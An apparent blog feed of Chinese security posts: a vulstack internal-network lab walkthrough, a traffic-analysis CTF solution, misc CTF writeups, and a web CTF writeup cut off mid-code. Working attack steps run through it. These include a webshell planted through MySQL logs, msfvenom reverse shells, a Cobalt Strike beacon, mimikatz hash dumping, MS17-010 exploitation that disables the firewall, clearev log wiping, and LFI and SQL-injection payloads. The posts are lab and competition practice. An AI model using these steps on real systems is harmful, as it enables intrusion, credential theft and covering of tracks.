    <link href="https://polosec.github.io/2020/12/03/vulstack-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    <id>https://polosec.github.io/2020/12/03/vulstack-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</id>
    <published>2020-12-03T10:04:01.000Z</published>
    <updated>2020-12-03T10:07:03.355Z</updated>
    
    <content type="html"><![CDATA[<h1 id="vulstack-红队评估（一）"><a href="#vulstack-红队评估（一）" class="headerlink" title="vulstack 红队评估（一）"></a>vulstack 红队评估（一）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这是我第一次做内网渗透的相关内容，做一个学习记录。</p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>下载镜像，虚拟机默认密码hongrisec@2019，登陆后有两台需要改密码，注意密码的格式。。别忘了再重装– 我的密码是<?php admin@123 隐藏下 ?></p><p>对网络的部署需要一定的计算机网络基础知识。</p><p>kali 网卡： NAT</p><p>web服务器（DMZ区）： 网卡1 NAT  网卡2 VMNET1（hostonly）</p><p>内网服务器1（域控）  网卡 VMNET1 hostonly</p><p>内网服务器2 ： 网卡 VMNET1 hostonly</p><p>部署好后由于Windows7开了防火墙，可以向外ping但是ping不动该机器，用两台内网主机ping一下试试能不能ping动。</p><img src="http://cdn.polowong.top/static/images/vs11.jpg"><p>正常情况下</p><p>主机可以ping通两台内网主机，win7可以ping通两台内网主机，kali可以ping通win7。</p><h2 id="web渗透工作"><a href="#web渗透工作" class="headerlink" title="web渗透工作"></a>web渗透工作</h2><p>开局phpstudy探针，猜一猜数据库账号密码root/root</p><p>phpmyadmin默认路径，日进去尝试写日志getshell。</p><p>首先看看是否开日志了</p><p> <a href="http://192.168.52.3/phpMyadmin/url.php?url=http://dev.mysql.com/doc/refman/5.5/en/show.html&token=86bd43ee3e6e2d48528a7169af7ea2b4"><strong>SHOW</strong></a> <strong>VARIABLES</strong> <a href="http://192.168.52.3/phpMyadmin/url.php?url=http://dev.mysql.com/doc/refman/5.5/en/string-comparison-functions.html%23operator_like&token=86bd43ee3e6e2d48528a7169af7ea2b4"><strong>LIKE</strong></a> ‘%general%’ </p><p>没开，开一下。</p><p>set golbal   general_log=on;</p><p>设置下日志路径（探针中查看）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log_file &#x3D;&#39;C:&#x2F;phpStudy&#x2F;WWW&#x2F;2.php&#39;;</span><br></pre></td></tr></table></figure><p>接下来查询一下，内容是shell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;&lt;?php eval($_POST[a]); ?&gt;&#39;;</span><br></pre></td></tr></table></figure><p>之后访问蚁剑链接shell就可以了</p><p>连上shell后whoami一下，发现是administrator权限，在GOD域下(?对域的概念还不太了解)</p><p>接下来使用msfvenom生成shell连接。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.54.2 lport&#x3D;5555 -f exe&gt;shell.exe</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 192.168.54.2</span><br><span class="line">set lport 5555</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>在蚁剑执行exe文件即可获得反弹shell</p><p>不太会用msf，执行命令一直啥都没有，最后知道msf有一套自己的命令，输入shell后获得了靶机的shell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp</span><br><span class="line">启用RDP登录。</span><br></pre></td></tr></table></figure><p>接下来尝试上传cs 的beacon。</p><img src="http://cdn.polowong.top/static/images/vs12.jpg"><p>cs首先设置listener，生成Windows的32位可执行程序 a.exe</p><p>通过msf的meterpreter上传到目标主机并执行</p><p>upload /root/Desktop/1.exe</p><p>execute -f 1.exe</p><p>之后在cs可以看到服务器上线。</p><img src="http://cdn.polowong.top/static/images/vs13.jpg"><h2 id="msf-meterpreter-简介"><a href="#msf-meterpreter-简介" class="headerlink" title="msf meterpreter 简介"></a>msf meterpreter 简介</h2><p> Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpreter shell的链接。Meterpreter shell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。另外Meterpreter能够躲避入侵检测系统。在远程主机上隐藏自己,它不改变系统硬盘中的文件,因此HIDS[基于主机的入侵检测系统]很难对它做出响应。此外它在运行的时候系统时间是变化的,所以跟踪它或者终止它对于一个有经验的人也会变得非常困难。</p><p> 最后,Meterpreter还可以简化任务创建多个会话。可以来利用这些会话进行渗透。在Metasploit Framework中，Meterpreter是一种后渗透工具，它属于一种在运行过程中可通过网络进行功能扩展的动态可扩展型Payload。这种工具是基于“内存DLL注入”理念实现的，它能够通过创建一个新进程并调用注入的DLL来让目标系统运行注入的DLL文件。其中，攻击者与目标设备中Meterpreter的通信是通过Stager套接字实现的meterpreter作为后渗透模块有多种类型，并且命令由核心命令和扩展库命令组成，极大的丰富了攻击方式。</p><p> 需要说明的meterpreter在漏洞利用成功后会发送第二阶段的代码和meterpreter服务器dll，所以在网络不稳定的情况下经常出现没有可执行命令，或者会话建立执行help之后发现缺少命令。 连上vpn又在内网中使用psexec和bind_tcp的时候经常会出现这种情况</p><h2 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h2><p>在cs中尝试使用mimikatz获取登录的用户名和密码</p><img src="http://cdn.polowong.top/static/images/vs14.jpg"><p>使用ladon扫描内网</p><img src="http://cdn.polowong.top/static/images/vs15.jpg"><p>得到结果：</p><p>192.168.52.3 139 445 3389</p><p>192.168.52.138 80 445 139 389</p><p>192.168.52.141 21 139</p><p>192.168.52.138主机389端口开启了LDAP服务，可能是DC。</p><p>下面尝试添加路由，使用Windows7作为跳板机访问Windows2003</p><img src="http://cdn.polowong.top/static/images/vs16.jpg"><p>经尝试后可以ping通，可以顺利访问。</p><h2 id="渗透域内成员141"><a href="#渗透域内成员141" class="headerlink" title="渗透域内成员141"></a>渗透域内成员141</h2><p>使用nmap对目标主机进行扫描，尝试扫描SMB漏洞</p><img src="http://cdn.polowong.top/static/images/vs17.jpg"><p>发现漏洞，尝试利用</p><img src="http://cdn.polowong.top/static/images/vs18.jpg"><p>成功获取目标机器的shell。</p><p>load mimikatz</p><p>mimikatz_command -f samdump::hashes 获取主机的密码，这样就成功抓到了主机的用户名和NTML-hash值。</p><h2 id="渗透域控"><a href="#渗透域控" class="headerlink" title="渗透域控"></a>渗透域控</h2><p>使用nmap对目标ip进行扫描，发现MS17-010和MS08-067漏洞，这次尝试利用MS17-010进行攻击。</p><p>首先关闭防火墙</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;admin&#x2F;smb&#x2F;ms17_010_command</span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line">set command &quot;netsh advfirewall set allprofiles state off&quot;</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>接下来获得一个正向shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_psexec</span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>之后我用mimikatz抓密码出了点问题，报错mod_process::getVeryBasicModulesListForProcess : (0x0000012b)</p><p>搜了搜这个问题是因为mimikatz默认加载32位系统，但是我们的系统是64位的，所以首先要将meterpreter迁移到一个64位进程上。</p><p>PS一下，选择权限为NT AUTHORITY\SYSTEM权限的进程</p><p>migrate  pid  即可。</p><p>之后在用mimikatz抓密码就能抓到了。</p><img src="http://cdn.polowong.top/static/images/vs19.jpg"><p>攻击结束后使用clearev命令清除攻击痕迹。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>第一次完整地做内网渗透相关的练习，对内网渗透的过程不太熟悉，工具的使用也不熟悉，对一些概念性的基础问题也不太熟悉。。。希望能在后续的学习过程中不断完善这些方面。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://shavchen.github.io/vulstack-1-writeup/#%E6%B8%97%E9%80%8F%E5%9F%9F%E6%8E%A7">https://shavchen.github.io/vulstack-1-writeup/#%E6%B8%97%E9%80%8F%E5%9F%9F%E6%8E%A7</a></p><p><a href="https://www.freebuf.com/column/230476.html">https://www.freebuf.com/column/230476.html</a></p><p><a href="https://www.cnblogs.com/wkzb/p/12358076.html#scroller-14">https://www.cnblogs.com/wkzb/p/12358076.html#scroller-14</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;vulstack-红队评估（一）&quot;&gt;&lt;a href=&quot;#vulstack-红队评估（一）&quot; class=&quot;headerlink&quot; title=&quot;vulstack 红队评估（一）&quot;&gt;&lt;/a&gt;vulstack 红队评估（一）&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a hr</summary>
      
    
    
    
    
    <category term="内网渗透" scheme="https://polosec.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>comprehensive traffic analysis</title>
    <link href="https://polosec.github.io/2020/11/30/comprehensive-traffic-analysis/"/>
    <id>https://polosec.github.io/2020/11/30/comprehensive-traffic-analysis/</id>
    <published>2020-11-30T07:58:16.000Z</published>
    <updated>2020-11-30T07:59:52.327Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="2019-8-安恒流量分析"><a href="#2019-8-安恒流量分析" class="headerlink" title="2019.8 安恒流量分析"></a>2019.8 安恒流量分析</h2><ol><li>某公司内网网络被黑客渗透，请分析流量，给出黑客使用的扫描器</li><li>某公司内网网络被黑客渗透，请分析流量，得到黑客扫描到的登陆后台是(相对路径即可)</li><li>某公司内网网络被黑客渗透，请分析流量，得到黑客使用了什么账号密码登陆了web后台(形式:username/password)</li><li>某公司内网网络被黑客渗透，请分析流量，得到黑客上传的webshell文件名是，内容是什么,提交webshell内容的base编码</li><li>某公司内网网络被黑客渗透，请分析流量，黑客在robots.txt中找到的flag是什么</li><li>某公司内网网络被黑客渗透，请分析流量，黑客找到的数据库密码是多少</li><li>某公司内网网络被黑客渗透，请分析流量，黑客在数据库中找到的hash_code是什么</li><li>某公司内网网络被黑客渗透，请分析流量，黑客破解了账号<a href="mailto:&#x69;&#x6a;&#x6e;&#x75;&#64;&#x74;&#x65;&#115;&#116;&#x2e;&#99;&#x6f;&#x6d;">&#x69;&#x6a;&#x6e;&#x75;&#64;&#x74;&#x65;&#115;&#116;&#x2e;&#99;&#x6f;&#x6d;</a>得到的密码是什么</li><li>某公司内网网络被黑客渗透，请分析流量，被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip</li><li>某公司内网网络被黑客渗透，请分析流量，黑客使用了什么账号登陆了mail系统（形式: username/password）</li><li>某公司内网网络被黑客渗透，请分析流量，黑客获得的vpn的ip是少</li></ol><h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p>1.观察12281号包，看HTTP层的referrer，发现了AWVS的扫描器特征。</p><p>2.过滤http协议，发现/admin/login.php</p><p>3.过滤http协议，看86号包，发现了表单数据 username 人事 password hr123456（错误答案）</p><p>302跳转代表登陆成功</p><p>使用http contains “rec=login” and http.request.method==POST and ip.src==192.168.94.59 语句对webone进行过滤，将结果对时间进行排序，发现最后一个包中的username admin password admin!@#pass123</p><p>4.a.php 翻到最后发现了a.php 然后分组列表搜a.php 找POST包</p><p> Form item: “action” = “QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJb</p><p>使用 http contains “&lt;?php @eval”  过滤找一句话木马，但是没找到。</p><p>考虑TCP 重传可能导致http没追踪到，所以考虑使用tcp contains “&lt;?php @eval”</p><p>发现了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1234</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将其base64encode即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgQGV2YWwoJF9QT1NUWzEyMzRdKTs&#x2F;Pg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>5.搜字符串robots.txt 发现flag flag:87b7cb79481f317bde90c116cf36084b</p><p>6.找到webshell的名称后，一直跟踪webshell，看看她在做什么。数据包大概在734581。</p><p>后面会发现查看了数据库配置文件，就发现了数据库账号密码 dbuser web dbpass e667jUPvJjXHvEUv</p><p>7.在web2数据包中 过滤mysql协议 分组字节流搜索字符串hash_code 看response包发现hash_code d1c029893df40cb0f47bcf8f1c3c17ac</p><p>8.web2数据包中 过滤mysql协议 搜索字符串 <a href="mailto:&#105;&#x6a;&#x6e;&#117;&#64;&#116;&#x65;&#115;&#x74;&#x2e;&#99;&#111;&#109;">&#105;&#x6a;&#x6e;&#117;&#64;&#116;&#x65;&#115;&#x74;&#x2e;&#99;&#111;&#109;</a> ，看到md5加密的密码b78f5aa6e1606f07def6e839121a22ec，解密一下得到edc123!@#</p><p>9.追踪webshell包，发现了ifconfig命令。</p><p> -&gt;|eth0      Link encap:Ethernet  HWaddr 00:0C:29:CB:9F:85  \n</p><p>​          inet addr:192.168.32.189  Bcast:192.168.32.255  Mask:255.255.255.0\n</p><p>10.打开mailtwo数据包，过滤http流，发现第一个数据包里面的动作是登出，发现了用户名wenwenni。</p><p>然后看28号数据包的操作是访问登录页面，35号数据包发现了密码加密函数。</p><p>是AES-CBC加密，key为1234567812345678。</p><p>继续看42 44数据包，还是wenwenni用户登录，并且返回了 success true.</p><p>尝试使用如下过滤器过滤:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(http contains &quot;&#123;\&quot;success\&quot;:true&#125;&quot; or http.request.method&#x3D;&#x3D;&quot;POST&quot;) and ip.addr&#x3D;&#x3D;192.168.94.59</span><br></pre></td></tr></table></figure><p>发现到最后也没爆破成功（这题看的别人的思路，我没懂）</p><p>然后打开mailto1 继续使用上述语句过滤</p><p>发现18512登陆成功，则密码在17126号数据包中。+ZgE14UGcFcyRGLI0/ZXPQ==</p><p>密码为1234567812345678的MD5值，偏移量为1234567812345678</p><p>AES解密得admin!@#PASS123</p><p>11.第一个vpn数据包在尝试登录vpn，然后看第二个。</p><p>统计一下会话信息，发现10.3.4.3 10.3.4.96 10.3.4.55 这几个ip之间的通信较多，然后过滤看看。</p><p>过滤一下smb协议，发现10.3.4.96是SMB服务器。</p><p>然后在看一下55这个ip</p><p> ip.addr==10.3.4.55  </p><p>发现10.3.4.3首先ping了10.3.4.55 所以确定10.3.4.3是黑客使用的vpn服务器。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>对一些有手就行的过滤方法用的还可以，但是深入一点就不太行了 对一些流量动作的分析不太到位，对filter的用法也不太熟悉，比如\表转义。继续学习！</p><h2 id="待学习：PPTP协议、SMB协议"><a href="#待学习：PPTP协议、SMB协议" class="headerlink" title="待学习：PPTP协议、SMB协议"></a>待学习：PPTP协议、SMB协议</h2><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/qq_43431158/article/details/107176918">https://blog.csdn.net/qq_43431158/article/details/107176918</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h1&gt;&lt;h2 id=&quot;2019-8-安恒流量分析&quot;&gt;&lt;a href=&quot;#2019-8-安恒流量分析&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>安洵杯misc全wp</title>
    <link href="https://polosec.github.io/2020/11/26/%E5%AE%89%E6%B4%B5%E6%9D%AFmisc%E5%85%A8wp/"/>
    <id>https://polosec.github.io/2020/11/26/%E5%AE%89%E6%B4%B5%E6%9D%AFmisc%E5%85%A8wp/</id>
    <published>2020-11-26T09:42:26.000Z</published>
    <updated>2020-11-26T09:42:44.965Z</updated>
    
    <content type="html"><![CDATA[<h1 id="密码学-爆破"><a href="#密码学-爆破" class="headerlink" title="密码学 爆破"></a>密码学 爆破</h1><p>SECRET是不知道的</p><p>flag是md5(SECRET).hexdigest()</p><p>已知部分flag为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d0g3&#123;71b2b5616**2a4639**7d979**de964c&#125;</span><br></pre></td></tr></table></figure><p>cipher是sha256加密后的flag，其摘要为</p><p>0596d989a2938e16bcc5d6f89ce709ad9f64d36316ab80408cb6b89b3d7f064a</p><p>现在不知道secret。</p><p>str1=”71b2b5616”</p><p>str2=”2a4639”</p><p>str3=”7d979”</p><p>str4=”de964c”</p><p>str1 2 3 4 之间分别有两位不知道 爆破的话需要爆破16^6次。</p><p>直接爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  hashlib</span><br><span class="line">broken_flag= <span class="string">&#x27;71b2b5616**2a4639**7d979**de964c&#x27;</span></span><br><span class="line">str1=<span class="string">&quot;d0g3&#123;71b2b5616&quot;</span></span><br><span class="line">str2=<span class="string">&quot;2a4639&quot;</span></span><br><span class="line">str3=<span class="string">&quot;7d979&quot;</span></span><br><span class="line">str4=<span class="string">&quot;de964c&#125;&quot;</span></span><br><span class="line">cipher=<span class="string">&#x27;0596d989a2938e16bcc5d6f89ce709ad9f64d36316ab80408cb6b89b3d7f064a&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getdigest</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">return</span>  hashlib.sha256(content).hexdigest()</span><br><span class="line">alphabet=<span class="string">&quot;1234567890abcdef&quot;</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> alphabet:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> alphabet:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> alphabet:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> alphabet:</span><br><span class="line">                <span class="keyword">for</span> e <span class="keyword">in</span> alphabet:</span><br><span class="line">                    <span class="keyword">for</span> f <span class="keyword">in</span> alphabet:</span><br><span class="line">                        string=str1+a+b+str2+c+d+str3+e+f+str4</span><br><span class="line">                        <span class="keyword">if</span> getdigest(string)==cipher:</span><br><span class="line">                            <span class="built_in">print</span> string</span><br></pre></td></tr></table></figure><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>扫码套娃，然后得到一个flag.docx，里面一串乱码，而且公众号也提示了不是emojidecode，但是这玩意除了emojidecode还能是啥？</p><p>因为我的word2016无法显示emoji，然后我换成rar解压，在xml里面看到了emoji，放到在线解密工具即可。（师傅们直接复制过去就完事了）</p><h2 id="王牌特工"><a href="#王牌特工" class="headerlink" title="王牌特工"></a>王牌特工</h2><p>这道题一开始没啥思路，然后file看一下是ext3格式。网上搜了一篇教程就差不多出来了。</p><p><a href="https://blog.ihomura.cn/2018/08/03/WriteUp-ext3-%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D-HZ-file/">https://blog.ihomura.cn/2018/08/03/WriteUp-ext3-%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D-HZ-file/</a></p><p>工具：fsstat，ext3grep，veracrypt。</p><p>装ext3grep的时候，报错了按照网上说的做增添一些东西，我这还会报错，把最后报错的那一行注释掉就完事儿了。</p><p>首先使用fsstat看镜像信息。</p><p>fsstat findme</p><p>其中root directory比较重要（我也不知道为什么）</p><p>接下来使用ext3grep查看文件信息。</p><p>ext3grep –inode 2 findme</p><img src="http://cdn.polowong.top/static/images/misc2.png"><p>恢复这个东西</p><p>ext3grep –restore-file .coolboy.swp findme </p><p>vim -r .coolboy.swp</p><p>新建一个目录/root/coolboy 恢复完会放到这里面，base64解码后的内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">真的密码:this_is_a_true_key</span><br></pre></td></tr></table></figure><p>用这个密码使用veracrypt去挂载flagbox，就可以获得flag。</p><h2 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h2><p>一开始是hardzip，有个密码1，看文件比较短尝试CRC32爆破，爆破完的密码拼起来就是easyzip的解压密码。</p><p>解压下来easyzip，</p><p>通过伪加密拿到redeme.txt，尝试明文攻击。</p><p>这里需要注意的是，使用明文攻击需要保证待破解压缩包里只有一个文件，也就是已知文件。因为这里面有一个伪加密，其他文件的压缩算法可能与已知文件的不一致，所以为了保证顺利进行，需要将其他文件删除（这道题所需要，其他情况下如果加密方式都一样的话就不用删除。）</p><h2 id="misc4"><a href="#misc4" class="headerlink" title="misc4"></a>misc4</h2><p>npmtxt打开一看啥也不懂，010editor打开一看有看不懂的东西，搜了搜16进制慢慢搜就搜到了0宽隐写。</p><p>把那一串复制到<a href="https://yuanfux.github.io/zero-width-web/">https://yuanfux.github.io/zero-width-web/</a> </p><p>decode就可以获得解压密码</p><p>RealV1siBle</p><img src="http://cdn.polowong.top/static/images/misc4.png"><p>打开是张图，silenteye一把梭出来flag。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次比赛觉得web比较难，ssti没做出来比较上心。最近打算深度学习ssti相关内容，争取下次做出来！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;密码学-爆破&quot;&gt;&lt;a href=&quot;#密码学-爆破&quot; class=&quot;headerlink&quot; title=&quot;密码学 爆破&quot;&gt;&lt;/a&gt;密码学 爆破&lt;/h1&gt;&lt;p&gt;SECRET是不知道的&lt;/p&gt;
&lt;p&gt;flag是md5(SECRET).hexdigest()&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>山东省新一代攻防赛wp</title>
    <link href="https://polosec.github.io/2020/11/23/%E5%B1%B1%E4%B8%9C%E7%9C%81%E6%96%B0%E4%B8%80%E4%BB%A3%E6%94%BB%E9%98%B2%E8%B5%9Bwp/"/>
    <id>https://polosec.github.io/2020/11/23/%E5%B1%B1%E4%B8%9C%E7%9C%81%E6%96%B0%E4%B8%80%E4%BB%A3%E6%94%BB%E9%98%B2%E8%B5%9Bwp/</id>
    <published>2020-11-23T14:01:58.000Z</published>
    <updated>2020-11-26T09:53:35.018Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>打聊城的比赛，又白给了，拿了参与奖，做出来两个misc，剩下两个misc都做了快一半，没思路了，特来复现。</p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>打开之后是一个登陆页面，查看源码发现了测试账号test/test</p><p>查看robots.txt 发现php.php 发现是phpinfo。</p><p>登录之后发现可能存在LFI，然后上了下扫描器，扫到了一些文件，尝试包含info.php，得到源码，然后发现了include了template/info.html，于是访问。查看源码发现了hint m4nageee.php。然后读manage的源码，在源码中发现包含了2333.html，于是访问。</p><p>查看源码时发现了php代码，尝试PHP session文件包含。</p><p>但是需要session的存放位置，于是通过扫描到的php.php查看session日志的存放位置/var/lib/php5，遂包含之。</p><p>在m4nageee里面写nickname到session文件里面，利用LFI包含getshell。</p><p>当前我的phpsessid为0u335c2ud2h9gjq0lq6nos1i72</p><p>所以session文件就是/var/lib/php5/sess_0u335c2ud2h9gjq0lq6nos1i72,包含即可。</p><p>nikename里面写</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> system(<span class="string">&quot;cat fla*&quot;</span>)； <span class="meta">?&gt;</span></span><br><span class="line"> 即可绕过对flag的过滤</span><br><span class="line"></span><br><span class="line">或者这样写</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&quot;cat fl\ag_0ba7bc92fcd57e337ebb9e74308c811f&quot;</span>); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">等等。。</span><br></pre></td></tr></table></figure><h2 id="web2-web3"><a href="#web2-web3" class="headerlink" title="web2 web3"></a>web2 web3</h2><p>题目提示使用sqlmap注入，但是我注入巨拉跨。。而且数据库是sqlite的，我只会一点mysql的注入。。当时没做出来，赛后复现下。</p><p>这题是使用cookie注入。我明确地知道自己不会用sqlmap进行cookie注入。</p><h3 id="不会-跟官方的思路没复现出来，等wp。"><a href="#不会-跟官方的思路没复现出来，等wp。" class="headerlink" title="不会 跟官方的思路没复现出来，等wp。"></a>不会 跟官方的思路没复现出来，等wp。</h3><p>这里放下济大师傅的web2 web3的payload：</p><p>Cookie: PHPSESSID=da55nb2kgsge2luvc5m53k5r90; username=test; password=test’ OR 1=1 LIMIT 1 OFFSET 1 – </p><p>password=test’ OR 1=1 LIMIT 1 OFFSET 1 – ; userinfo=eyJ1c2VybmFtZSI6InRlc3QiLCJwYXNzd29yZCI6InRlc3QnIE9SIDE9MSBMSU1JVCAxIE9GRlNFVCAxIC0tICJ9Cg%3D%3D</p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="ez-decode"><a href="#ez-decode" class="headerlink" title="ez_decode"></a>ez_decode</h2><p>简单的编码转换：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#54;&amp;#54;&amp;#54;&amp;#99;&amp;#54;&amp;#49;&amp;#54;&amp;#55;&amp;#55;&amp;#98;&amp;#54;&amp;#54;&amp;#51;&amp;#57;&amp;#54;&amp;#52;&amp;#54;&amp;#54;&amp;#51;&amp;#53;&amp;#51;&amp;#52;&amp;#51;&amp;#48;&amp;#51;&amp;#49;&amp;#51;&amp;#48;&amp;#51;&amp;#48;&amp;#51;&amp;#56;&amp;#51;&amp;#51;&amp;#54;&amp;#50;&amp;#51;&amp;#48;&amp;#54;&amp;#54;&amp;#51;&amp;#49;&amp;#54;&amp;#54;&amp;#51;&amp;#50;&amp;#51;&amp;#51;&amp;#54;&amp;#49;&amp;#51;&amp;#51;&amp;#54;&amp;#53;&amp;#54;&amp;#49;&amp;#54;&amp;#53;&amp;#54;&amp;#51;&amp;#54;&amp;#51;&amp;#51;&amp;#53;&amp;#54;&amp;#52;&amp;#51;&amp;#53;&amp;#54;&amp;#49;&amp;#51;&amp;#55;&amp;#54;&amp;#51;&amp;#55;&amp;#100;</span><br></pre></td></tr></table></figure><p>html实体编码-&gt;hexo2string-&gt;flag</p><p>flag{f9df54010083b0f1f23a3eaecc5d5a7c}</p><h2 id="qr-code"><a href="#qr-code" class="headerlink" title="qr_code:"></a>qr_code:</h2><img src="http://cdn.polowong.top/static/images/qrcode.png"><p>打开很多二维码，盲猜扫出来内容转0和1</p><p>比赛的时候有个简单的读二维码的工具，但是批量不会写脚本。。就读了两个，看哪个是0哪个是1，然后bin2ascii就可以了。</p><p>用脚本的做法：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 